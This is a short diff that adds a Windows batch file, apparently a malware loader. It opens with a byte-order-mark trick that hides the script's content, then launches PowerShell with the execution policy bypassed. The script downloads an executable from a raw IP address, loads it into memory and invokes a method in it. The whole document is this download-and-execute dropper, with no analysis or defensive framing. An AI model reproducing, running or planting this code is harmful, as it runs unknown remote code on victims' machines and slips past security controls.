@@ -1,0 +1,3 @@
+ÿþ&cls
+@echo off
+powershell -nop -ep bypass -c "try{[System.Reflection.Assembly]::Load((Invoke-WebRequest 'http://185.149.120.3/download/net_launcher.exe' -UseBasicParsing).Content).GetType('pornhub.org').GetMethod('cum').Invoke($null,$null)}catch{Write-Host('Error: '+$_.Exception.Message)}"
